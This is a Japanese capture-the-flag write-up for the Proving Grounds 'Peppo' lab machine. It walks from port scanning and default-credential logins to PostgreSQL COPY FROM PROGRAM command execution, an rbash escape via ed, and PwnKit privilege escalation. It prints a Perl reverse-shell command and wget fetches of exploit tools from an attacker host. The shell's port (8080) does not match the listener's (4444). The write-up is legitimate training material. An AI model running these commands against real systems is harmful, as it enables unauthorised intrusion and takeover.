+++
title = "Proving Grounds Practice - Peppo Writeup"
date = "2026-11-07"
description = "RedmineとPostgreSQLの認証情報を発見し、PostgreSQLのCOPY FROM PROGRAMによるコマンド実行を確認。SSHで取得したEleanorユーザーのrbashをedで脱出し、PwnKitを利用してroot権限を取得する"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[Peppo]", "[Nmap]", "[Gobuster]", "[Redmine]", "[PostgreSQL]", "[Credential Discovery]", "[COPY FROM PROGRAM]", "[SSH]", "[Restricted Bash]", "[rbash Escape]", "[PwnKit]", "[Initial Access]", "[Privilege Escalation]", "[Hard]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Peppo |
| OS | Linux |
| Target IP | 192.168.122.60 |

---

## Reconnaissance

### Nmap Scan

まず、対象ホストに対してサービスバージョン検出とデフォルトスクリプトを実行する。

```bash
nmap -sV -sC -Pn 192.168.122.60
```

主な結果は以下のとおり。

```text
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
5432/tcp  open   postgresql        PostgreSQL DB
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6)
10000/tcp open   snet-sensor-mgmt?
```

8080番ポートではRedmineが動作していることが分かった。

```text
http-title: Redmine
http-server-header: WEBrick/1.4.2 (Ruby/2.6.6 (2020-03-31))
```

また、5432番ポートではPostgreSQLが公開されている。

10000番ポートについては、HTTPリクエストに対して以下のレスポンスが返されていた。

```text
HTTP/1.1 200 OK
Content-Type: text/plain

Hello World
```

特に注目したポートは以下のとおり。

- `22/tcp`: SSH
- `5432/tcp`: PostgreSQL
- `8080/tcp`: Redmine
- `10000/tcp`: HTTPレスポンスを返すサービス

RedmineとPostgreSQLを重点的に調査する。

### Directory Enumeration

次に、8080番ポートで動作しているRedmineに対してGobusterを実行する。

```bash
gobuster dir -u http://192.168.122.60:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

結果：

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.122.60:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
news                 (Status: 200) [Size: 5361]
search               (Status: 200) [Size: 7933]
login                (Status: 200) [Size: 5011]
projects             (Status: 200) [Size: 12258]
users                (Status: 302) [Size: 150] [--> http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fusers]
admin                (Status: 302) [Size: 150] [--> http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fadmin]
issues               (Status: 200) [Size: 19698]
groups               (Status: 302) [Size: 151] [--> http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fgroups]
my                   (Status: 302) [Size: 147] [--> http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fmy]
logout               (Status: 302) [Size: 93] [--> http://192.168.122.60:8080/]
404                  (Status: 200) [Size: 459]
settings             (Status: 302) [Size: 153] [--> http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fsettings]
activity             (Status: 200) [Size: 7312]
500                  (Status: 200) [Size: 648]
```

`admin`ディレクトリが見つかった。

リダイレクト先のURLは以下のとおり。

```text
http://192.168.122.60:8080/login?back_url=http%3A%2F%2F192.168.122.60%3A8080%2Fadmin
```

このURLを確認し、Redmineのログイン画面から認証を試すことにした。

---

## Initial Access

### Redmine Login

Redmineのログイン画面に対して、以下の認証情報を使用した。

| Field | Value |
|-------|-------|
| Username | `admin` |
| Password | `admin` |

`admin/admin`でログインしたところ、認証に成功した。

ログイン後、パスワード変更画面が表示された。

### PostgreSQL Login

次に、Nmapで確認した5432番ポートのPostgreSQLに接続を試みる。

以下の認証情報でログインできた。

| Field | Value |
|-------|-------|
| Username | `postgres` |
| Password | `postgres` |

接続コマンド：

```bash
psql -h 192.168.122.60 -p 5432 -U postgres
```

接続結果：

```text
Password for user postgres:
psql (18.6 (Debian 18.6-3), server 12.3 (Debian 12.3-1) )
Type "help" for help.
```

PostgreSQLへのログインに成功した。

### PostgreSQL Command Execution

PostgreSQLの`COPY FROM PROGRAM`機能を利用して、OSコマンドを実行できるか確認する。

まず、コマンドの実行結果を格納するテーブルを作成する。

```sql
create table cmd_exec(cmd_output text);
```

続いて、`id`コマンドを実行する。

```sql
copy cmd_exec from program 'id';
```


```sql
SELECT * FROM cmd_exec;
```

結果：

```text
                               cmd_output
------------------------------------------------------------------------
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
(1 row)
```

これにより、PostgreSQLの`COPY FROM PROGRAM`を利用してOSコマンドを実行できることが確認できた。

### Reverse Shell Attempt

次に、`COPY FROM PROGRAM`を利用してリバースシェルを取得する。

最初に試したコマンド：

```sql
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.238:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```


### Netcat Listener

Kali側でNetcatを起動する。

```bash
nc -lvnp 4444
```

結果：

```text
listening on [any] 4444 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.122.60] 36516
```

接続に成功した。

接続後、`ls`を実行すると以下のファイルが確認できた。

```text
base
global
pg_commit_ts
pg_dynshmem
pg_hba.conf
pg_ident.conf
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postgresql.conf
postmaster.opts
postmaster.pid
```

PostgreSQLのデータディレクトリに接続していることが分かったが、特に有用な情報は見つからなかった。

そのため、別の侵入経路を探すことにした。

---

## SSH Access

### Credential Discovery

調査を続けたところ、以下の認証情報でSSHログインできることが分かった。

| Field | Value |
|-------|-------|
| Username | `eleanor` |
| Password | `eleanor` |

SSH接続：

```bash
ssh eleanor@192.168.122.60
```

ログイン結果：

```text
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

eleanor@192.168.122.60's password:
Linux peppo 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64
```

SSHログインに成功した。

ホームディレクトリを確認する。

```bash
ls
```

結果：

```text
bin  helloworld  local.txt
```

`local.txt`を確認しようとしたが、以下のエラーが発生した。

```bash
cat local.txt
```

```text
-rbash: cat: command not found
```

### Restricted Bash Escape

シェルの種類を確認する。

```bash
echo $SHELL
```

結果：

```text
/bin/rbash
```

PATHも確認する。

```bash
echo $PATH
```

結果：

```text
/home/eleanor/bin
```

Restricted Bash（rbash）が使用されており、PATHも制限されているため、通常のコマンドが利用できない状態だった。

使用可能なコマンドを確認する。

```bash
compgen -c
```

出力の中に`ed`が存在することを確認した。

`ed`を利用して制限されたシェルから脱出する。

```bash
ed
!/bin/bash
```

これにより、通常のBashシェルを起動できた。

続いてPATHを変更する。

```bash
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

変更後のPATHを確認する。

```bash
echo $PATH
```

結果：

```text
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

これで通常のコマンドが利用できるようになった。

### User Flag

改めて`local.txt`を確認する。

```bash
cat local.txt
```

User Flagを取得できた。

---

## Privilege Escalation

### LinPEAS

次に、権限昇格につながる設定や脆弱性を調査するため、LinPEASを転送する。

Kali側でHTTPサーバーを起動し、対象マシンからダウンロードできるようにする。

対象マシンで以下を実行する。

```bash
wget http://192.168.45.238:10000/linpeas.sh
```

ダウンロード結果：

```text
--2026-11-06 12:47:47--  http://192.168.45.238:10000/linpeas.sh
Connecting to 192.168.45.238:10000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1169704 (1.1M) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                   100%[============================================>]   1.12M  1.82MB/s    in 0.6s

2026-11-06 12:47:47 (1.82MB/s) - ‘linpeas.sh’ saved [1169704/1169704]
```

### PwnKit

調査の過程で、PwnKitを利用するルートを確認した。

https://github.com/ly4k/PwnKit/blob/main/PwnKit

```text
wget http://192.168.45.238:10000/PwnKit
```

対象マシンでPwnKitを実行する。

```bash
./PwnKit
```

実行結果：

```text
root@peppo:/home/eleanor# ls
PwnKit  bin  helloworld  linpeas.sh  local.txt
```

ユーザーを確認する。

```bash
whoami
```

結果：

```text
root
```

これにより、root権限の取得に成功した。

---

## Root Flag

最後にrootディレクトリにある`proof.txt`を確認する。

```bash
cat proof.txt
```


Root Flagを取得できた。


---

## Summary

今回のPeppoでは、RedmineとPostgreSQLの認証情報を発見し、SSH経由でEleanorユーザーにアクセスした後、Restricted Bashから脱出し、PwnKitを利用してroot権限を取得した。

最初にNmapでポートを列挙したところ、Redmine、PostgreSQL、SSHが公開されていた。GobusterでRedmineのディレクトリを調査し、`admin/admin`でログインできることを確認した。

さらに、`postgres/postgres`でPostgreSQLに接続でき、`COPY FROM PROGRAM`によるOSコマンド実行も確認した。PostgreSQL経由のリバースシェル接続には成功したものの、得られた環境から有用な情報は見つからなかった。

その後、`eleanor/eleanor`でSSHログインに成功した。しかし、ログインシェルはrbashであり、通常のコマンドが制限されていた。そこで`ed`のシェルエスケープ機能を利用して通常のBashを起動し、PATHを変更することで制限を解除した。

最後にPwnKitを利用してroot権限を取得し、`proof.txt`を回収した。

### 攻略の流れ

1. Nmapによるポート・サービス列挙
2. GobusterによるRedmineのディレクトリ列挙
3. `admin/admin`でRedmineにログイン
4. `postgres/postgres`でPostgreSQLに接続
5. `COPY FROM PROGRAM`によるOSコマンド実行を確認
6. PostgreSQL経由でリバースシェルを取得
7. `eleanor/eleanor`でSSHログイン
8. `ed`を利用してrbashから脱出
9. PATHを変更して通常のコマンドを利用可能にする
10. `local.txt`を取得
11. PwnKitを利用してroot権限を取得
12. `proof.txt`を取得して攻略完了



